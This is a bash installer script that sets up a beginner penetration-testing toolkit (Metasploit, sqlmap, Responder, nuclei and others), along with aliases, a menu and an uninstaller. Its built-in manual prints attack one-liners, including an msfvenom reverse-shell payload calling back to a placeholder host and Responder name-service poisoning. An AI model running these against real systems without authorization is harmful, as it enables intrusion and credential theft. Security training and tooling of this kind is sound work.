#!/usr/bin/env bash
#
#  ###################################
#  #  N O O B   I N S T A L L E R    #
#  ###################################
#

##############################################
#            GLOBAL CONFIG
##############################################

PENTEST_DIR="$HOME/Pentest"
TOOLS_DIR="$PENTEST_DIR/Tools"
VENV_DIR="$PENTEST_DIR/noobie_venv" 
LOGFILE="$PENTEST_DIR/noobie-install.log"
ALIAS_FILE="$HOME/.noobie_aliases"

# Ensure directories exist
mkdir -p "$TOOLS_DIR"

##############################################
#            COLOR CODES
##############################################
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
CYAN="\e[36m"
MAGENTA="\e[35m"
RESET="\e[0m"
BOLD="\e[1m"

##############################################
#            LOGGING FUNCTION
##############################################
log() {
    echo -e "$(date +"%Y-%m-%d %H:%M:%S") :: $1" | tee -a "$LOGFILE"
}

##############################################
#     RUN COMMAND WITH RETRY
##############################################
run_cmd() {
    local cmd="$1"
    local retries=3
    local count=0

    # Display command before running
    echo -e "${CYAN}Executing: $cmd${RESET}"

    # Use a subshell to execute the command so we can pipe and tee output reliably
    until eval "$cmd" >>"$LOGFILE" 2>&1; do
        count=$((count+1))
        if [ $count -ge $retries ]; then
            echo -e "${RED}[✖] FAILED after $count retries:${RESET} $cmd"
            log "FAILED after retries: $cmd"
            return 1
        fi
        echo -e "${YELLOW}[!] Retry $count for: ${cmd}${RESET}"
        sleep 5
    done
    return 0
}

##############################################
#        PRETTY SECTION BANNERS
##############################################
section() {
    echo -e "\n${MAGENTA}====================================================${RESET}"
    echo -e "${CYAN}$1${RESET}"
    echo -e "${MAGENTA}====================================================${RESET}"
}

##############################################
#        ENSURE jq INSTALLED (for GitHub API calls)
##############################################
install_jq() {
    section "Installing 'jq' (JSON parser)"
    if ! command -v jq >/dev/null 2>&1; then
        run_cmd "sudo apt update"
        run_cmd "sudo apt install -y jq"
    else
        echo -e "${GREEN}jq is already installed.${RESET}"
    fi
}

##############################################
#           FIX METASPLOIT INSTALLATION
##############################################
install_metasploit() {
    section "Installing Metasploit Framework"
    
    if command -v msfconsole >/dev/null 2>&1; then
        echo -e "${GREEN}Metasploit is already installed.${RESET}"
        return 0
    fi
    
    echo -e "${YELLOW}Installing Metasploit dependencies...${RESET}"
    
    # Install dependencies
    run_cmd "sudo apt update"
    run_cmd "sudo apt install -y build-essential libreadline-dev libssl-dev libpq5 libpq-dev libreadline5 libsqlite3-dev libpcap-dev openjdk-17-jre git-core autoconf postgresql pgadmin3 curl zlib1g-dev libxml2-dev libxslt1-dev vncviewer libyaml-dev curl nmap gem"
    
    # Install Metasploit via git (alternative method if apt fails)
    echo -e "${YELLOW}Cloning Metasploit Framework...${RESET}"
    local msf_dir="$TOOLS_DIR/metasploit-framework"
    
    if [ ! -d "$msf_dir" ]; then
        run_cmd "git clone https://github.com/rapid7/metasploit-framework.git $msf_dir"
        run_cmd "cd $msf_dir && sudo bash -c 'for MSF in $(ls $msf_dir/bin/*); do ln -s $MSF /usr/local/bin/; done'"
    fi
    
    # Also try to install via gem as backup
    echo -e "${YELLOW}Installing via Ruby gem...${RESET}"
    run_cmd "sudo gem install bundler"
    run_cmd "cd $msf_dir && sudo bundle install"
    
    # Install using official installer script
    echo -e "${YELLOW}Trying official installer...${RESET}"
    run_cmd "curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > /tmp/msfinstall"
    run_cmd "chmod +x /tmp/msfinstall"
    run_cmd "sudo /tmp/msfinstall"
    
    # Initialize database
    echo -e "${YELLOW}Initializing Metasploit database...${RESET}"
    run_cmd "sudo systemctl start postgresql"
    run_cmd "sudo msfdb init"
    
    echo -e "${GREEN}Metasploit installation attempt completed.${RESET}"
    echo -e "${YELLOW}If msfconsole still not found, you may need to log out and log back in.${RESET}"
}

##############################################
#           INSTALL SEARCHSPLOIT (Exploit-DB)
##############################################
install_searchsploit() {
    section "Installing Searchsploit (Exploit-DB)"
    
    if command -v searchsploit >/dev/null 2>&1; then
        echo -e "${GREEN}Searchsploit is already installed.${RESET}"
        return 0
    fi
    
    echo -e "${YELLOW}Installing Exploit-DB tools...${RESET}"
    
    # Install via git
    local exploitdb_dir="$TOOLS_DIR/exploitdb"
    
    if [ ! -d "$exploitdb_dir" ]; then
        run_cmd "git clone https://github.com/offensive-security/exploitdb.git $exploitdb_dir"
        run_cmd "sudo ln -sf $exploitdb_dir/searchsploit /usr/local/bin/searchsploit"
    fi
    
    # Also install via apt if available
    run_cmd "sudo apt update"
    run_cmd "sudo apt install -y exploitdb"
    
    # Update database
    run_cmd "searchsploit -u"
    
    echo -e "${GREEN}Searchsploit installed.${RESET}"
}

##############################################
#           ENSURE MSFVENOM IS AVAILABLE
##############################################
install_msfvenom() {
    section "Ensuring MSFVenom is available"
    
    if command -v msfvenom >/dev/null 2>&1; then
        echo -e "${GREEN}MSFVenom is already installed.${RESET}"
        return 0
    fi
    
    echo -e "${YELLOW}MSFVenom should come with Metasploit. Checking...${RESET}"
    
    # Check if it's in the metasploit directory
    local msf_dir="$TOOLS_DIR/metasploit-framework"
    if [ -f "$msf_dir/msfvenom" ]; then
        run_cmd "sudo ln -s $msf_dir/msfvenom /usr/local/bin/msfvenom"
    fi
    
    # If still not found, install standalone
    if ! command -v msfvenom >/dev/null 2>&1; then
        echo -e "${YELLOW}Installing standalone MSFVenom...${RESET}"
        run_cmd "sudo apt install -y metasploit-framework"
    fi
    
    echo -e "${GREEN}MSFVenom should now be available.${RESET}"
}

##############################################
#           INSTALL APT TOOLS (Core Tools)
##############################################
install_apt_tools() {
    section "Installing APT Packages (Nmap, Go, Python-Venv, etc.)"

    run_cmd "sudo apt update"

    APT_TOOLS=(
        # Core Network Scanning and Analysis
        nmap dnsutils whois net-tools wireshark tshark tcpdump
        
        # Web Application Tools (wpscan installed by gem later)
        sqlmap ffuf gobuster
        
        # Password Cracking & Wireless
        john hashcat aircrack-ng hcxtools
        
        # Basic Dependencies + GO language compiler + VENV support + Ruby for wpscan
        python3 python3-pip python3-venv git build-essential golang-go ruby-full zlib1g-dev
        
        # Additional useful tools
        netcat-traditional socat telnet ftp ssh-client hydra nikto
        
        # Exploitation tools
        exploitdb
        
        # Reverse shell utilities
        rlwrap
        
        # Wordlists
        wordlists seclists
    )

    for tool in "${APT_TOOLS[@]}"; do
        echo -e "${CYAN}Installing $tool...${RESET}"
        # APT checks if installed and updated; we rely on run_cmd retries for stability.
        run_cmd "sudo apt install -y $tool"
    done
    
    # Install Metasploit separately
    install_metasploit
    
    # Install Searchsploit
    install_searchsploit
    
    # Ensure MSFVenom
    install_msfvenom
}

##############################################
#        INSTALL WPScan (via Ruby Gem)
##############################################
install_wpscan() {
    section "Installing WPScan (via Ruby Gem)"
    
    # Check if a global gem is executable
    if command -v wpscan >/dev/null 2>&1; then
        echo -e "${GREEN}WPScan is already installed (via gem or system). Skipping gem installation.${RESET}"
    else
        # The 'gem install' command handles updates/checking efficiently
        echo -e "${CYAN}Installing WPScan via gem...${RESET}"
        run_cmd "sudo gem install wpscan"
        echo -e "${GREEN}[✔] WPScan installed via Ruby Gem.${RESET}"
    fi
}

##############################################
#       SETUP PYTHON VIRTUAL ENVIRONMENT
##############################################
setup_venv() {
    section "Setting up Python Virtual Environment"

    if [ ! -d "$VENV_DIR" ]; then
        echo -e "${CYAN}Creating virtual environment at $VENV_DIR...${RESET}"
        run_cmd "python3 -m venv $VENV_DIR"
    else
        echo -e "${YELLOW}Virtual environment already exists in $VENV_DIR. Skipping creation.${RESET}"
    fi
}

##############################################
#         INSTALL PYTHON LIBRARIES (IN VENV) - SMARTER CHECK ADDED
##############################################
install_python_libs() {
    section "Installing Global/VENV Python Dependencies"
    
    # 1. Install pipx system-wide (using system's pip3)
    echo -e "${CYAN}Checking/Installing pipx system-wide...${RESET}"
    if ! command -v pipx >/dev/null 2>&1; then
        run_cmd "pip3 install pipx"
        run_cmd "pipx ensurepath"
    else
        echo -e "${GREEN}pipx is already installed (system-wide).${RESET}"
    fi

    # 2. Use the venv's pip to install core libraries
    local PY_LIBS=(requests bs4 paramiko scapy pwntools beautifulsoup4 lxml)
    
    echo -e "${CYAN}Checking/Installing core Python modules into VENV...${RESET}"
    
    for lib in "${PY_LIBS[@]}"; do
        # pip handles the check/update efficiently inside the VENV
        run_cmd "$VENV_DIR/bin/pip install $lib"
    done

    # 3. Install impacket using pipx
    local PIPX_PKG="impacket"
    # Check if binary is in the standard ~/.local/bin or the venv bin (common for pipx)
    local PIPX_BINARY1="$HOME/.local/bin/$PIPX_PKG" 
    local PIPX_BINARY2="$VENV_DIR/bin/$PIPX_PKG"

    echo -e "${CYAN}Checking/Installing $PIPX_PKG using pipx...${RESET}"
    # Check if the tool is executable in either common pipx location
    if ([ ! -f "$PIPX_BINARY1" ] || [ ! -x "$PIPX_BINARY1" ]) && ([ ! -f "$PIPX_BINARY2" ] || [ ! -x "$PIPX_BINARY2" ]); then
        if command -v pipx >/dev/null 2>&1; then
            run_cmd "pipx install $PIPX_PKG"
        else
            echo -e "${RED}Skipping $PIPX_PKG: pipx is not available - please fix pipx failure first.${RESET}"
        fi
    else
        echo -e "${GREEN}${PIPX_PKG} is already installed in a known location. Skipping.${RESET}"
    fi
}

##############################################
#           INSTALL GIT TOOLS (Cloning tools)
# (SMARTER CHECK IMPLEMENTED - Clones if not exists, pulls if it does)
##############################################
install_git_tool() {
    local name="$1"
    local repo="$2"
    local target="$TOOLS_DIR/$name"

    echo -e "${CYAN}--- Checking/Cloning $name ---${RESET}"

    if [ ! -d "$target" ]; then
        # Clone if the directory does not exist
        run_cmd "git clone --depth 1 \"$repo\" \"$target\""
    else
        echo -e "${YELLOW}Tool $name already exists. Pulling latest code...${RESET}"
        # Pull to update if the directory exists
        run_cmd "git -C \"$target\" pull"
    fi
}

##############################################
#           INSTALL GO TOOLS (Compiled from source) - SMARTER CHECK ADDED
##############################################
install_go_tool() {
    local name="$1"
    local repo="$2"
    local BINARY_PATH="$HOME/go/bin/$name"

    echo -e "${CYAN}--- Checking/Installing Go tool: $name ---${RESET}"
    
    # Check if the compiled binary already exists and is executable
    if [ -f "$BINARY_PATH" ] && [ -x "$BINARY_PATH" ]; then
        echo -e "${GREEN}Tool $name binary found at $BINARY_PATH. Assuming up-to-date and skipping compilation.${RESET}"
        return 0
    fi

    if ! command -v go >/dev/null 2>&1; then
        echo -e "${RED}[✖] Go compiler not found. Skipping Go tool installation.${RESET}"
        return 1
    fi

    # If not found or not executable, run the installation. Go handles @latest updates.
    run_cmd "go install $repo@latest"
}

install_advanced_tools() {
    section "Cloning and Installing Pentest Tools (Go, Git, Pipx)"

    # Go-based Tools (High performance, compiled)
    install_go_tool "subfinder" "github.com/projectdiscovery/subfinder/cmd/subfinder"
    install_go_tool "katana" "github.com/projectdiscovery/katana/cmd/katana"
    install_go_tool "nuclei" "github.com/projectdiscovery/nuclei/v2/cmd/nuclei"
    install_go_tool "assetfinder" "github.com/tomnomnom/assetfinder"
    install_go_tool "httpx" "github.com/projectdiscovery/httpx/cmd/httpx"
    install_go_tool "naabu" "github.com/projectdiscovery/naabu/v2/cmd/naabu"
    install_go_tool "dnsx" "github.com/projectdiscovery/dnsx/cmd/dnsx"

    # Git-cloned Tools (Tools that are python scripts requiring cloning)
    install_git_tool "dirsearch" "https://github.com/maurosoria/dirsearch"
    install_git_tool "ghauri" "https://github.com/r0oth3x49/ghauri" 
    install_git_tool "SecLists" "https://github.com/danielmiessler/SecLists" 
    install_git_tool "Responder" "https://github.com/lgandx/Responder"
    install_git_tool "linpeas" "https://github.com/carlospolop/PEASS-ng"
    install_git_tool "windows-exploit-suggester" "https://github.com/AonCyberLabs/Windows-Exploit-Suggester"
    install_git_tool "linux-exploit-suggester" "https://github.com/mzet-/linux-exploit-suggester"
    
    # Install additional Python tools
    echo -e "${CYAN}Installing additional Python tools...${RESET}"
    run_cmd "$VENV_DIR/bin/pip install sqlmap"  # Ensure sqlmap is in venv too
    run_cmd "$VENV_DIR/bin/pip install scoutsuite"
    
    # Burp Suite Note for User
    section "Burp Suite Manual Installation"
    echo -e "${YELLOW}Burp Suite (Community or Pro) is a critical web proxy that requires a manual download and installation from PortSwigger's website. Please do this after the script finishes.${RESET}"
}

##############################################
#           CREATE ALIASES FILE (Standardized Aliases)
##############################################
create_aliases() {
    section "Creating ~/.noobie_aliases"

# Note: Using 'cat > filename' OWNS the file and OVERWRITES it every run, which is desired.
cat > "$ALIAS_FILE" << 'EOF'
# ============================
# NOOBIE INSTALLER v1 ALIASES - Standardized for Beginner Familiarity
# ============================

# Quick Menu Launcher
alias noobie="$HOME/Pentest/Tools/noobie-menu"

# Go-compiled Tools (Binary Command Names)
alias subfinder="$HOME/go/bin/subfinder" 
alias katana="$HOME/go/bin/katana"
alias nuclei="$HOME/go/bin/nuclei"
alias assetfinder="$HOME/go/bin/assetfinder"
alias httpx="$HOME/go/bin/httpx"
alias naabu="$HOME/go/bin/naabu"
alias dnsx="$HOME/go/bin/dnsx"

# Python Tools (Custom path, aliased to maintain standard tool command names)
alias dirsearch="$HOME/Pentest/noobie_venv/bin/python $HOME/Pentest/Tools/dirsearch/dirsearch.py"
alias ghauri="$HOME/Pentest/noobie_venv/bin/python $HOME/Pentest/Tools/ghauri/ghauri.py" 
alias Responder="$HOME/Pentest/noobie_venv/bin/python $HOME/Pentest/Tools/Responder/Responder.py" 
alias linpeas="$HOME/Pentest/Tools/linpeas/linpeas.sh"

# Exploitation Tools
alias searchsploit="searchsploit"
alias msfconsole="msfconsole"
alias msfvenom="msfvenom"
alias metasploit="msfconsole"

# Utility Commands
alias update-noobie="cd $HOME/Pentest && git pull && echo 'Updated Noobie Installer'"

# Disclaimer Reminder
alias noobie_disclaimer="echo -e \"\n[!!!] DISCLAIMER: Any hacking or exploitation, the developer has no legal obligation. Use at your own risk.\n\""

EOF

    echo -e "${GREEN}[✔] Aliases created.${RESET}"
}

##############################################
#     ENSURE ~/.bashrc SOURCES THE ALIASES AND GO PATH (Safe Re-run)
##############################################
add_alias_source() {
    section "Configuring Shell Environment"
    
    # 1. Source the aliases file (only adds once)
    if ! grep -q "source ~/.noobie_aliases" "$HOME/.bashrc"; then
        echo "source ~/.noobie_aliases" >> "$HOME/.bashrc"
        log "Added alias source to .bashrc"
        echo -e "${GREEN}[✔] Added alias source to ~/.bashrc.${RESET}"
    else
        echo -e "${YELLOW}Alias source is already in ~/.bashrc. Skipping.${RESET}"
    fi

    # 2. Add Go binary path to PATH (only adds once)
    if ! grep -q 'export PATH="$PATH:$HOME/go/bin"' "$HOME/.bashrc"; then
        echo 'export PATH="$PATH:$HOME/go/bin"' >> "$HOME/.bashrc"
        log "Added Go bin path to .bashrc"
        echo -e "${GREEN}[✔] Added $HOME/go/bin to PATH in ~/.bashrc.${RESET}"
    else
        echo -e "${YELLOW}Go bin path is already in ~/.bashrc. Skipping.${RESET}"
    fi
}

##############################################
#            CREATE MENU LAUNCHER 
##############################################
create_menu() {
    MENU_PATH="$TOOLS_DIR/noobie-menu"

cat > "$MENU_PATH" << 'EOF'
#!/usr/bin/env bash

# Use the established color codes
RED="\e[31m"
GREEN="\e[32m"
CYAN="\e[36m"
YELLOW="\e[33m"
MAGENTA="\e[35m"
RESET="\e[0m"

# Define the info function locally for the menu script
view_info() {
    clear
    echo -e "${CYAN}====================================================${RESET}"
    echo -e "${CYAN}--- NOOBIE INSTALLER v1 - ABOUT & ETHICS ---${RESET}"
    echo -e "${CYAN}====================================================${RESET}"
    
    echo -e "\n${CYAN}Developer Name: ${GREEN}Noobie Emci${RESET}"
    echo "Status: A professor and adviser in respective institutions, but is here dedicating time to the addictive field of Bug Bounty Hunting."
    
    echo -e "\n${CYAN}Project Concept: ${MAGENTA}NOOBIE Installer${RESET}"
    echo "This script is designated for newcomers. \"NOOBIE\" is used as a unifying title for a community promoting responsible and ethical security practices, similar to an anonymous handle or team concept."
    echo "The NOOBIE team strongly promotes ethical hacking and unequivocally condemns any form of unethical or malicious activity. Use these tools only on systems you own or have explicit, prior authorization to test."
    
    echo -e "\n${CYAN}Disclaimer: ${RED}Any hacking or exploitation, the developer has no legal obligation. Use at your own risk.${RESET}"
    
    echo -e "\nPress [Enter] to return to the main menu."
    read -r
}

# Define the manual function locally for the menu script
view_manuals() {
    clear
    echo -e "${CYAN}====================================================${RESET}"
    echo -e "${CYAN}--- NOOBIE MANUALS & USAGE GUIDES ---${RESET}"
    echo -e "${CYAN}====================================================${RESET}"

    # Tool listings
    echo -e "\n${CYAN}1. Nmap (Network Scanner)${RESET}"
    echo "Nmap is used to discover hosts and services on a network. Find common open ports and service versions: ${YELLOW}nmap -sV -O <target_ip>${RESET}"
    
    echo -e "\n${CYAN}2. Sqlmap (SQL Injection)${RESET}"
    echo "Sqlmap automates detecting and exploiting SQL injection flaws. Run a basic check on a vulnerable URL: ${YELLOW}sqlmap -u 'http://site.com/param=1' --batch${RESET}"
    
    echo -e "\n${CYAN}3. WPScan (WordPress Scanner)${RESET}"
    echo "WPScan checks WordPress sites for vulnerabilities in the core, themes, and plugins: ${YELLOW}wpscan --url http://example.com --enumerate vp${RESET}"

    echo -e "\n${CYAN}4. Metasploit (Exploitation Console)${RESET}"
    echo "The Metasploit Framework is a powerful exploitation tool. Launch the console: ${YELLOW}msfconsole${RESET} (then use 'search name' and 'exploit/module' commands inside)."
    echo "MSFVenom for payload creation: ${YELLOW}msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe > payload.exe${RESET}"

    echo -e "\n${CYAN}5. Searchsploit (Exploit Database)${RESET}"
    echo "Search for known exploits: ${YELLOW}searchsploit apache 2.4.49${RESET}"

    echo -e "\n${CYAN}6. Subfinder (Subdomain Discovery - Active)${RESET}"
    echo "Subfinder finds valid subdomains using active techniques like search engine scraping and certificate transparency: ${YELLOW}subfinder -d example.com${RESET}"

    echo -e "\n${CYAN}7. Assetfinder (Subdomain Discovery - Passive)${RESET}"
    echo "Assetfinder focuses on passive data sources like Crt.sh and VirusTotal to find domain-related assets: ${YELLOW}assetfinder example.com${RESET}"
    
    echo -e "\n${CYAN}8. Dirsearch (Web Directory Bruteforcer)${RESET}"
    echo "Dirsearch is used to bruteforce directories and files on a web server: ${YELLOW}dirsearch -u http://example.com -e php,html,js${RESET}"

    echo -e "\n${CYAN}9. Katana (Crawler/Linkfinder)${RESET}"
    echo "Katana is a fast web crawler to find all links from an initial URL. Output links only: ${YELLOW}katana -u http://example.com -jc${RESET}"

    echo -e "\n${CYAN}10. Nuclei (Vulnerability Scanner)${RESET}"
    echo "Nuclei sends requests based on open-source templates to scan for security issues. Run a basic scan against a target: ${YELLOW}nuclei -u http://example.com${RESET}"
    
    echo -e "\n${CYAN}11. Ghauri (Advanced SQL Injector)${RESET}"
    echo "Ghauri uses the same principles as sqlmap but a different approach, often useful when sqlmap fails: ${YELLOW}ghauri -u 'http://site.com/param=1'${RESET}"

    echo -e "\n${CYAN}12. Responder (LLMNR/NBT-NS/mDNS poisoner)${RESET}"
    echo "Responder is used to force endpoints to authenticate against the attacker by poisoning name services: ${YELLOW}Responder -I eth0 -wF${RESET}"
    
    echo -e "\nPress [Enter] to return to the main menu."
    read -r
}


while true; do
    clear
    echo -e "${CYAN}--- NOOBIE MENU ---${RESET}"
    echo -e "${CYAN}--- Tools Section ---${RESET}"
    echo -e "1) ${GREEN}Nmap${RESET} (Network Scanner) [CMD: nmap]"
    echo -e "2) ${GREEN}Sqlmap${RESET} (SQL Injection) [CMD: sqlmap]"
    echo -e "3) ${GREEN}WPScan${RESET} (WordPress Scanner) [CMD: wpscan]"
    echo -e "4) ${GREEN}Metasploit${RESET} (Exploitation Console) [CMD: msfconsole]"
    echo -e "5) ${GREEN}Searchsploit${RESET} (Exploit Database) [CMD: searchsploit]"
    echo -e "6) ${GREEN}MSFVenom${RESET} (Payload Creator) [CMD: msfvenom]"
    echo -e "-------------------------"
    echo -e "7) ${GREEN}Subfinder${RESET} (Subdomain Discovery - Active) [CMD: subfinder]"
    echo -e "8) ${GREEN}Assetfinder${RESET} (Subdomain Discovery - Passive) [CMD: assetfinder]"
    echo -e "9) ${GREEN}Dirsearch${RESET} (Web Directory Bruteforcer) [CMD: dirsearch]"
    echo -e "10) ${GREEN}Katana${RESET} (Crawler/Linkfinder) [CMD: katana]"
    echo -e "11) ${GREEN}Nuclei${RESET} (Vulnerability Scanner) [CMD: nuclei]"
    echo -e "12) ${GREEN}Ghauri${RESET} (Advanced SQL Injector) [CMD: ghauri]"
    echo -e "13) ${GREEN}Responder${RESET} (Name Resolution Attack Tool) [CMD: Responder]"
    echo -e "${MAGENTA}====================================================${RESET}"
    echo -e "${MAGENTA}--- Option Section ---${RESET}"
    echo -e "M) ${YELLOW}View Tool Manuals & Usage Guide${RESET}"
    echo -e "A) ${YELLOW}About NOOBIE Installer${RESET}"          
    echo -e "U) ${YELLOW}Update Noobie Tools${RESET}"
    echo -e "E) ${RED}Exit${RESET}"
    echo -e "-------------------------"

    # Display Disclaimer
    echo -e "${RED}DISCLAIMER: Any hacking or exploitation, the developer has no legal obligation. Use at your own risk.${RESET}"
    
    read -rp "> Enter choice (e.g., '1', 'M', or 'A'): " ch
    ch=$(echo "$ch" | tr '[:upper:]' '[:lower:]') # Convert to lowercase for case-insensitive check

    case "$ch" in
        1|"nmap") nmap ;;
        2|"sqlmap") sqlmap ;;
        3|"wpscan") wpscan ;;
        4|"metasploit"|"msfconsole"|"msf") msfconsole ;; 
        5|"searchsploit") searchsploit ;;
        6|"msfvenom") msfvenom ;;
        7|"subfinder") subfinder ;;
        8|"assetfinder") assetfinder ;;
        9|"dirsearch") dirsearch ;;
        10|"katana") katana ;;
        11|"nuclei") nuclei ;;
        12|"ghauri"|"gh") ghauri ;;
        13|"responder") Responder ;; # Note: Must be capitalized to match official tool name
        "m"|"manual") view_manuals ;;
        "a"|"about"|"info") view_info ;;  
        "u"|"update") update-noobie ;;
        "e"|"exit") exit 0 ;;
        *) echo -e "${RED}Invalid option: $ch${RESET}" ;;
    esac
    
    echo -e "\nPress [Enter] to continue..."
    read -r
done
EOF

    chmod +x "$MENU_PATH"
    echo -e "${GREEN}[✔] Menu launcher created at $MENU_PATH.${RESET}"
}

##############################################
#            CREATE UNINSTALLER (Unchanged but included for completeness)
##############################################
create_uninstaller() {
    section "Creating Uninstaller"
    UNINSTALLER_PATH="$TOOLS_DIR/noobie-uninstall.sh"

cat > "$UNINSTALLER_PATH" << EOF
#!/usr/bin/env bash
RED="\\e[31m"
GREEN="\\e[32m"
YELLOW="\\e[33m"
RESET="\\e[0m"

echo -e "\n${RED}====================================================${RESET}"
echo -e "${RED}         NOOBIE INSTALLER UNINSTALLER${RESET}"
echo -e "${RED}====================================================${RESET}"

read -rp "Are you sure you want to uninstall all Noobie tools and dependencies? (y/N): " confirm

if [[ "\$confirm" =~ ^[Yy]$ ]]; then
    # 1. Remove entire Pentest directory
    echo -e "\n${YELLOW}Removing \$HOME/Pentest directory...${RESET}"
    rm -rf "\$HOME/Pentest"
    
    # 2. Remove alias source command from .bashrc
    echo -e "${YELLOW}Removing alias source from \$HOME/.bashrc...${RESET}"
    sed -i '/source ~\/\\.noobie_aliases/d' "\$HOME/.bashrc"
    
    # 3. Remove go path from .bashrc
    echo -e "${YELLOW}Removing Go bin path from \$HOME/.bashrc...${RESET}"
    sed -i '/export PATH="\$PATH:\$HOME\/go\/bin"/d' "\$HOME/.bashrc"
    
    # 4. Remove all installed Go tools (only the compiled binaries)
    echo -e "${YELLOW}Deleting compiled Go binaries from \$HOME/go/bin...${RESET}"
    rm -f "\$HOME/go/bin/subfinder"
    rm -f "\$HOME/go/bin/katana"
    rm -f "\$HOME/go/bin/nuclei"
    rm -f "\$HOME/go/bin/assetfinder"
    rm -f "\$HOME/go/bin/httpx"
    rm -f "\$HOME/go/bin/naabu"
    rm -f "\$HOME/go/bin/dnsx"

    # 5. Remove gem installations
    echo -e "${YELLOW}Removing Ruby gem installations...${RESET}"
    sudo gem uninstall wpscan -a 2>/dev/null || true

    # 6. Remove Metasploit if installed via this script
    echo -e "${YELLOW}Removing Metasploit Framework...${RESET}"
    sudo rm -rf /opt/metasploit-framework 2>/dev/null || true
    sudo rm -f /usr/local/bin/msf* 2>/dev/null || true

    echo -e "\n${GREEN}Successfully uninstalled Noobie Installer environment!${RESET}"
    echo -e "${YELLOW}You must restart your terminal or run 'source ~/.bashrc' for changes to take effect.${RESET}"
else
    echo -e "${GREEN}Uninstallation cancelled.${RESET}"
fi
EOF

    chmod +x "$UNINSTALLER_PATH"
    echo -e "${GREEN}[✔] Uninstaller created at $UNINSTALLER_PATH.${RESET}"
}

##############################################
#                  MAIN EXECUTION
##############################################
clear
echo -e "${CYAN}###################################${RESET}"
echo -e "${CYAN}#  N O O B   I N S T A L L E R    #${RESET}"
echo -e "${CYAN}###################################${RESET}"
echo -e "${YELLOW}Developer Disclaimer: Any hacking or exploitation, the developer has no legal obligation. Use at your own risk.${RESET}"
echo -e "\nInstalling tools for the Noobie Installer v1...\n"

# Start fresh log
echo "=== Noobie Installer Log Started at $(date) ===" > "$LOGFILE"

install_jq
install_apt_tools
install_wpscan
setup_venv
install_python_libs
install_advanced_tools 
create_aliases
add_alias_source
create_menu
create_uninstaller

section "INSTALLATION COMPLETE"

echo -e "${BOLD}${GREEN}✓ Installation completed successfully!${RESET}"
echo -e "\n${CYAN}IMPORTANT NEXT STEPS:${RESET}"
echo -e "1. ${GREEN}Restart your terminal or run 'source ~/.bashrc'${RESET} to load the new tool aliases."
echo -e "2. ${GREEN}Launch the menu tool at any time by simply typing 'noobie'${RESET} in your terminal."
echo -e "3. ${YELLOW}Test Metasploit: Run 'msfconsole' to verify installation${RESET}"
echo -e "4. ${YELLOW}Test Searchsploit: Run 'searchsploit apache' to verify${RESET}"
echo -e "5. ${YELLOW}Test MSFVenom: Run 'msfvenom --help' to verify${RESET}"
echo -e "6. ${YELLOW}Manually install Burp Suite (Community or Pro) from PortSwigger's website, as it is a graphical Java application.${RESET}"
echo -e "\n${RED}Log file: $LOGFILE${RESET}"
echo -e "\n${RED}Noobie Installer v1${RESET}"
echo -e "${RED}Developer: Noobie Emci. from Noobie Team, a group dedicated to promoting ethical hacking.${RESET}"

# Final check
echo -e "\n${CYAN}Final verification:${RESET}"
if command -v msfconsole >/dev/null 2>&1; then
    echo -e "${GREEN}✓ Metasploit installed${RESET}"
else
    echo -e "${RED}✗ Metasploit not found - try 'sudo apt install metasploit-framework' manually${RESET}"
fi

if command -v searchsploit >/dev/null 2>&1; then
    echo -e "${GREEN}✓ Searchsploit installed${RESET}"
else
    echo -e "${RED}✗ Searchsploit not found${RESET}"
fi

if command -v msfvenom >/dev/null 2>&1; then
    echo -e "${GREEN}✓ MSFVenom installed${RESET}"
else
    echo -e "${RED}✗ MSFVenom not found${RESET}"
fi
